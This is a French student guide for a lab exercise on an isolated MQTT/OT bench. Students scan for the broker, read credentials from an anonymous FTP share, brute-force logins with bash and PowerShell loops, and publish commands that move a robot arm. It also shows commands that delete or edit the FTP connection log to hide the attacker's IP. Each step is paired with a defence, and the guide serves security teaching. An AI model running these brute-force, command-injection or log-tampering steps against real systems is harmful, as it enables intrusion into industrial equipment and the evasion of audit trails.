# Guide étudiant — TP sécurité MQTT / OT (banc « bras robot »)

**Cadre :** exercice pratique sur le **banc du TP** (réseau isolé, fourni par l'encadrant),
à but pédagogique : comprendre les faiblesses d'un objet industriel connecté pour les corriger.
Chaque étape montre **une faille** et **comment la refermer**.

Le banc expose (déjà en marche) : un broker MQTT (port 1883), un serveur FTP (port 21),
et un bras robot qui suit un cycle. Objectif : **atteindre le bras et modifier sa position**,
puis lister les défenses qui l'auraient empêché.

> ⚠️ **Connecte-toi au même réseau que le bras robotique.** Vérifie bien que tu n'es pas
> sur un réseau différent de celui qui t'a été donné.

---

## Installer sur sa machine

- **Mosquitto** : https://mosquitto.org/download/
- **Nmap** : https://nmap.org/download.html
- Ajoute `C:\Program Files\mosquitto` et `C:\Program Files\Nmap` au **PATH** pour taper les
  commandes directement (l'emplacement exact dépend de où tu les as installés).

---

## Aide-mémoire des paramètres

| Paramètre | Rôle |
|---|---|
| `-h` | adresse du broker |
| `-t` | l'étiquette (*topic*) à écouter/publier ; `"#"` = joker (toutes les étiquettes) |
| `-v` | afficher étiquette + contenu (`mosquitto_sub`) |
| `-m` | le message à publier (`mosquitto_pub`) |
| `-u` / `-P` | utilisateur / mot de passe |

---

## Exercice 1 — Reconnaissance réseau

Un service ne se voit pas forcément dans un scan par défaut : il faut cibler les ports.
```
nmap -p 1883 --open 192.168.1.0/24
```
→ Avec `--open`, tu identifies directement la ou les machines qui exposent le port **MQTT (1883)**.

**Faille :** un service de gestion MQTT directement joignable depuis le réseau.
**Défense :** segmentation réseau (VLAN OT séparé), pare-feu qui n'autorise que les flux attendus.

---

## Exercice 2 — FTP en accès anonyme

- Fais cette fois un scan plus détaillé de ta cible, pour voir *tous* les services ouverts.
- Certaines configurations ne sont peut-être pas à jour, ou acceptent un mot de passe
  **extrêmement faible**... voire aucun mot de passe du tout.
- **Astuce :** pour quitter un client en ligne de commande, on tape parfois `bye`.
- **Bonus :** fais attention aux traces que tu laisses derrière toi.

**Faille :** partage de fichiers sans authentification → fuite d'informations sensibles.
**Défense :** désactiver l'accès anonyme, exiger un compte, chiffrer.

---

## Exercice 3 — Authentification MQTT

Essaie d'écouter le broker sans identifiant :
```
mosquitto_sub -h <ip_du_banc> -t "#" -v
```
→ `Connection Refused: not authorised` : le broker exige un compte.

Les fichiers récupérés à l'exercice 2 servent à retrouver un couple valide. Boucle bash
(Git Bash / Linux) qui teste chaque **utilisateur × mot de passe** des deux fichiers :
```bash
USERS=users.txt
PASSWORDS=passwords.txt
while read -r u; do
  while read -r p; do
    mosquitto_sub -h <ip_du_banc> -u "$u" -P "$p" -t '$SYS/broker/version' -C 1 -W 2 </dev/null >/dev/null 2>&1 \
      && { echo "[+] Valide : $u / $p"; break 2; }
  done < "$PASSWORDS"
done < "$USERS"
```

Sous Windows sans bash, même logique en **PowerShell** (crée le fichier `brute.ps1`, puis
exécute-le avec `powershell -ExecutionPolicy Bypass -File brute.ps1`) :
```powershell
$broker = "<ip_du_banc>"   # remplace par la vraie IP, pas un espace réservé
:found foreach ($u in Get-Content users.txt) {
  foreach ($p in Get-Content passwords.txt) {
    mosquitto_sub -h $broker -u $u -P $p -t '$SYS/broker/version' -C 1 -W 2 *> $null
    if ($LASTEXITCODE -eq 0) { Write-Host "[+] Valide : $u / $p"; break found }
  }
}
```

**Faille :** compte faible + identifiants stockés en clair sur un partage ouvert.
**Défense :** mots de passe forts et uniques, jamais posés sur un FTP, limitation des tentatives.

---

## Exercice 4 — Écoute et commande

Avec le couple trouvé, écoute le trafic :
```
mosquitto_sub -h <ip_du_banc> -u <user> -P <pass> -t "#" -v
```
→ Tu vois l'étiquette qui donne l'état du bras (`brasrobot/etat`), grâce au contrôleur qui
l'interroge en continu.

**Astuce :** une autre étiquette te semble visible dans ce flux ? Qu'est-ce qu'elle pourrait
te permettre de faire ?

Publie alors une consigne pour **modifier la position** :
```
mosquitto_pub -h <ip_du_banc> -u <user> -P <pass> -t <étiquette observée> -m "<valeurs observées>"
```
→ Le bras bouge. **TP réussi.**

...mais as-tu vraiment été discret jusqu'ici ? Qu'as-tu laissé derrière toi, et un
administrateur réseau l'aurait-il remarqué ?

**Faille :** aucune vérification que la commande vient d'une source légitime.
**Défense :** ACL par sujet (chaque compte limité à ses topics), TLS (port 8883), et côté
équipement, refuser les consignes hors bornes.

---

## Exercice 5 — Effacer ses traces (ou pas)

Reconnecte-toi au FTP. Un dossier `journal/` existe à la racine du partage, avec un
fichier `connexions.log` qui liste les connexions (IP, date/heure, login) — le tien y est.

```
cd journal
get connexions.log
```

**Option A — tout supprimer :**
```
delete connexions.log
```
→ Efficace, mais radical : un journal qui disparaît intégralement se remarque.

**Option B — ne retirer que TES lignes** (plus discret : le journal des autres connexions
reste intact, rien ne semble avoir disparu). Il faut éditer le fichier **en local** après
l'avoir téléchargé (`get`), puis le renvoyer pour remplacer l'original :

En PowerShell :
```powershell
(Get-Content connexions.log) | Where-Object { $_ -notmatch '192.168.1.65' } | Set-Content connexions.log
```
En Git Bash / Linux (avec `sed`, en place) :
```bash
sed -i '/192.168.1.65/d' connexions.log
```
*(remplace `192.168.1.65` par ta propre IP)*

Puis renvoie le fichier modifié :
```
put connexions.log
```

**Question de debrief :** cette suppression/modification efface-t-elle vraiment toute
trace de ton passage ? Sur un vrai système, où d'autre une activité réseau pourrait-elle
être enregistrée, hors de ta portée ?

**Faille :** le seul journal existant est à l'intérieur du système attaqué — aucune
protection contre l'altération après coup.
**Défense :** journalisation centralisée (SIEM), journaux en écriture seule/append-only,
horodatage signé, alerte sur toute modification/suppression de log.

---

## Bilan défense (à retenir)

| Faille du banc | Correction |
|---|---|
| Services OT exposés au réseau | Segmentation + pare-feu |
| FTP anonyme | Auth obligatoire, FTPS/SFTP |
| Identifiants sur un partage | Secrets jamais exposés, rotation |
| Broker sans mot de passe fort | `allow_anonymous false` + comptes forts |
| Pas de droits par sujet | ACL par topic |
| Trafic en clair | TLS (8883) |
| Consignes non validées | Bornes/limites côté équipement |
| Traces laissées sur le système | Effacement sécurisé, supervision centralisée (un vrai SOC s'en rend compte) |
